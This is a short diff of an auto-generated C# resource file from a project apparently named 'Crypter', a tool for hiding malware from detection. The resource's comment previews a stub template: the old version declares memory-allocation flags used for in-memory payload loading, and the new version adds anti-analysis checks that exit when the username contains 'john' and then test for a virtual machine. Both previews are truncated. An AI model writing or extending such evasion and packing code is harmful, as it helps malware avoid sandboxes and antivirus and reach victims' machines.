@@ -62,27 +62,27 @@ namespace Crypter.Properties {
         
         /// <summary>
         ///   查找类似 using System;
-        ///using System.IO;
-        ///using System.IO.Compression;
+        ///using System.Data;
         ///using System.Linq;
-        ///using System.Management;
         ///using System.Reflection.Emit;
         ///using System.Reflection;
         ///using System.Runtime.InteropServices;
-        ///using System.Diagnostics;
         ///using System.Text;
+        ///using System.Windows.Forms;
+        ///using System.Management;
         ///
-        ///namespace v
+        ///namespace WindowsFormsApp7
         ///{
-        ///    internal static class Module1
+        ///    public partial class Form1 : Form
         ///    {
-        ///        [Flags]
-        ///        public enum AllocationType
+        ///        public Form1()
         ///        {
-        ///            Commit = 0x00001000,
-        ///            Reserve = 0x00002000,
-        ///            Decommit = 0x00004000,
-        ///            Release = 0x0000800 [字符串的其余部分被截断]&quot;; 的本地化字符串。
+        ///            try
+        ///            {
+        ///                if (Environment.UserName.ToLower().Contains(&quot;john&quot;))
+        ///                    return;
+        ///                if (IsVM())
+        ///             [字符串的其余部分被截断]&quot;; 的本地化字符串。
         /// </summary>
         internal static string String1 {
             get {
